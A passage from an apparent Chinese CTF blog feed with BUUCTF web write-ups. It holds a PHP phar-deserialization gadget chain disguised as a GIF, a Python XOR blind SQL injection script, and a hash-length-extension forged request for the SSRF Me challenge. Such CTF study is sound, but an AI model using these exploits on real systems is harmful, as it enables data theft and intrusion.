class="string">        &lt;tbody&gt;'</span>;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'</span></span><br><span class="line"><span class="string">          &lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">              $table .= <span class="string">'</span></span><br><span class="line"><span class="string">            &lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;</span></span><br><span class="line"><span class="string">            '</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          $table .= <span class="string">'</span></span><br><span class="line"><span class="string">            &lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;</span></span><br><span class="line"><span class="string">              &lt;a href="#" class="download"&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">              /</span></span><br><span class="line"><span class="string">              &lt;a href="#" class="delete"&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;/td&gt;</span></span><br><span class="line"><span class="string">            '</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;</span></span><br><span class="line"><span class="string">          '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $filename;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里由于存在文件操作函数<code>file_get_contents</code>，那么我们可以把一个序列化后的对象存储在<code>phar</code>文件中，由于<code>phar</code>文件在修改后缀后，也可以通过<code>phar://</code>协议来读，这样就突破了<code>jpg/png/gif</code>文件上传限制</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215140849.png" alt=""></p><p>具体详细参考<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p><strong>利用条件：</strong></p><ol><li>phar文件要能够上传到服务器端</li><li>要有可用的魔术方法作为“跳板”</li><li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file()</li><li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</li></ol><p>这里给出一个<code>Demo</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>做题修改这个<code>Demo</code>即可</p><p>这里由于<code>download</code>限制了可读路径，那么我们从<code>delete.php</code>文件入手</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215145053.png" alt=""></p><p>在删除文件的时候会调用<code>File</code>类的<code>delete()</code>函数，其中存在文件操作函数<code>unlink</code>，并且<code>phar</code>文件可以被上传到服务器，关键字符都没有被过滤，那么可以利用一下</p><p>在<code>File</code>类中存在文件读取操作函数<code>close</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215145702.png" alt=""></p><p>而在<code>User</code>类中，存在<code>__destruct</code>方法来调用自己类的<code>close</code>方法</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215152523.png" alt=""></p><p>如果这里设置</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">  $filename = <span class="string">"flag.txt"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $db = <span class="keyword">new</span> File();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即可实现<code>User</code>类中调用<code>File</code>的<code>close()</code>方法，实现<code>flag.txt</code>的读取</p><p>但这样直接调用是没有回显的</p><p>但看到<code>FileList</code>的<code>__call</code>方法<img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215152738.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215152503.png" alt=""></p><p>这里<code>__destruct</code>函数会把<code>result</code>给打印出来</p><p>而这里的<code>$file</code>参数可控，那么就可以实现通过<code>__destruct</code>方法来打印出我们需要的<code>flag</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $filename = <span class="string">"/flag.txt"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line"><span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $db;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub, 增加gif文件头，伪造文件类型</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大致流程是：</p><ol><li><code>User</code>这边声明<code>$db</code>为<code>FileList</code>对象，此时<code>User</code>的<code>__destruct</code>触发了<code>close</code>方法，但<code>FlieList</code>类中不存在<code>close</code>方法，触发了<code>__call</code>方法</li><li>这边由于<code>File</code>类中存在<code>colse</code>方法，并且方法作用返回文件内容，那么根据<code>FileList</code>类的<code>__call</code>方法来设置<code>$files</code>为<code>File</code>类，注意这里是<code>Array</code>，然后调用<code>File</code>类的<code>close</code>方法</li><li><code>FlieList</code>类中的<code>__call</code>能够执行<code>File</code>类的close方法的运行结果并存储到<code>$results</code>变量中，最后通过<code>__destruct</code>来打印出结果</li><li>总体类间顺序为<code>User-&gt;FileList-&gt;File</code></li></ol><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215162007.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目列表：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[极客大挑战 2019]PHP&lt;/li&gt;
&lt;li&gt;[极客大挑战 2019]Knife&lt;/li&gt;
&lt;li&gt;[SUCTF 2019]Pythonginx&lt;/li&gt;
&lt;li&gt;[BUUCTF 2018]Online Tool&lt;/li&gt;
&lt;li&gt;[极客大挑战 2019]Http&lt;/li&gt;
&lt;li&gt;[极客大挑战 2019]LoveSQL&lt;/li&gt;
&lt;li&gt;[ZJCTF 2019]NiZhuanSiWei&lt;/li&gt;
&lt;li&gt;[CISCN2019 华北赛区 Day1 Web1]Dropbox&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://a2u13.com/categories/CTF/"/>
    
    
      <category term="BUUCTF" scheme="https://a2u13.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题笔记（二）</title>
    <link href="https://a2u13.com/2020/02/12/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://a2u13.com/2020/02/12/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-02-12T08:22:57.000Z</published>
    <updated>2020-06-07T06:28:28.930Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p><p><strong>题目列表：</strong></p><ul><li>[CISCN2019 华北赛区 Day2 Web1]Hack World</li><li>[极客大挑战 2019]Havefun</li><li>[极客大挑战 2019]EasySQL</li><li>[De1CTF 2019]SSRF Me</li><li>[网鼎杯 2018]Fakebook</li><li>[极客大挑战 2019]Secret File</li><li>[RoarCTF 2019]Easy Java</li><li>[0CTF 2016]piapiapia</li></ul><a id="more"></a><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>这道题是<code>SQL注入</code>的题，先<code>FUZZ</code>看了一下能用的函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212163654.png" alt=""></p><p>而且经过测试，好像空格、<code>*</code>也被过滤了，但这里<code>^</code>没有被过滤，我们采用<code>异或注入</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212164131.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212164207.png" alt=""></p><p>可以看到存在两种结果，采用异或布尔盲注</p><p>这里写个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ascii_all = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> string.digits+string.ascii_lowercase+<span class="string">"-_&#123;&#125;"</span>:</span><br><span class="line">ascii_all.append(ord(each))</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">"http://f77810de-f667-4f92-9f94-24d0486a2784.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> ascii_all:</span><br><span class="line">payload = <span class="string">"1^!(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;)"</span>.format(i,j)</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"id"</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">c = session.post(url=url,data=data).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> c:</span><br><span class="line">flag = flag+ chr(j)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>这里知道<code>BUUCTF</code>的<code>flag</code>格式中没有大写和其他特殊符号就没加其他字符，其他题的话得加上，并且得使用<code>binary</code>来限定查询区分大小写</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212171418.png" alt=""></p><p><strong>题目源码：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbuser=<span class="string">'root'</span>;</span><br><span class="line">$dbpass=<span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    $blackList = <span class="keyword">array</span>(<span class="string">' '</span>,<span class="string">'||'</span>,<span class="string">'#'</span>,<span class="string">'-'</span>,<span class="string">';'</span>,<span class="string">'&amp;'</span>,<span class="string">'+'</span>,<span class="string">'or'</span>,<span class="string">'and'</span>,<span class="string">'`'</span>,<span class="string">'"'</span>,<span class="string">'insert'</span>,<span class="string">'group'</span>,<span class="string">'limit'</span>,<span class="string">'update'</span>,<span class="string">'delete'</span>,<span class="string">'*'</span>,<span class="string">'into'</span>,<span class="string">'union'</span>,<span class="string">'load_file'</span>,<span class="string">'outfile'</span>,<span class="string">'./'</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($blackList <span class="keyword">as</span> $blackitem)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos($sql,$blackitem))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$db = mysql_connect(<span class="string">"localhost"</span>,$dbuser,$dbpass);</span><br><span class="line"><span class="keyword">if</span>(!$db)&#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;   </span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>,$db);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(safe($id))&#123;</span><br><span class="line">    $query = mysql_query(<span class="string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($query)&#123;</span><br><span class="line">        $result = mysql_fetch_array($query);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($result)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $result[<span class="string">'content'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error Occured When Fetch Result."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        var_dump($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"SQL Injection Checked."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>这道题是成信工的新手入门题</p><p>很简单，直接<code>F12</code>看源码，拖到最下面</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212172053.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212172127.png" alt=""></p><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>也是羽哥哥出的题</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212172733.png" alt=""></p><p>直接闭合绕过就登陆了~</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212172805.png" alt=""></p><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>打开看到题目源码，这里格式化一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>题目大致流程是：</p><ul><li>在<code>/index</code>路由下读取题目源代码</li><li>然后在<code>/geneSign</code>路由下，通过传入<code>parm</code>的值，以及函数中生产的<code>action=scan</code>，通过<code>getSign</code>函数生成<code>md5(sectet_key+parm+&quot;scan&quot;)</code></li><li>在<code>/De1ta</code>路由下，通过<code>GET</code>传入<code>parm</code>的值，通过<code>cookies</code>传入<code>action、sign</code>的值，然后在<code>Task.Exec()</code>方法中，通过对<code>md5(secret_key+parm+action)</code>和<code>sign</code>的对比，如果满足两者相等的情况下：<ul><li>如果<code>action</code>中有<code>scan</code>，则会读取<code>parm</code>参数的的文件内容，然后写入到<code>result.txt</code>文件中</li><li>如果<code>action</code>中有<code>read</code>，则会读取<code>result.txt</code>文件的内容，存到<code>result[&#39;data&#39;]</code>中，最后在<code>json.dumps</code>的作用下全部<code>dump</code>出来</li></ul></li></ul><p>上面就是这段代码的大致流程，对于这道题有三种解法：</p><h2 id="哈希扩展攻击"><a href="#哈希扩展攻击" class="headerlink" title="哈希扩展攻击"></a>哈希扩展攻击</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212201446.png" alt=""></p><p>首先在<code>geneSign</code>路由下通过设置<code>param</code>为<code>flag.txt</code>得到</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">md5</span><span class="params">(secret_key+<span class="string">"flag.txt"</span>+<span class="string">"scan"</span>)</span></span>=<span class="number">209</span>e0c24824fd44e017a2a0392ce8115</span><br></pre></td></tr></table></figure><p>要想得到<code>flag</code>,这需要计算<code>md5(secret_key+&quot;flag.txt&quot;+&quot;scanread&quot;)</code>的值并与上面的计算结果一致</p><p>这里使用<strong><code>HashPump</code></strong>工具</p><p>这里<code>Signature</code>为原始的哈希值</p><p>附加数据为后面的<code>scan</code></p><p>由于<code>secret_key</code>的长度为16位切固定，加上后面的<code>flag.txt</code>长度为8，则输入的长度为24位</p><p>最后我们新的哈希后面部分为<code>scanread</code>，则追加数据为<code>read</code></p><p>最后生成新的</p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</span><br><span class="line"><span class="keyword">sign</span>=<span class="number">97e65</span>e9f2b787e7da361b36819f4858f</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212202036.png" alt=""></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 535ebc6b-ea0e-47d0-85c5-826d3bdb4f18.node3.buuoj.cn</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: 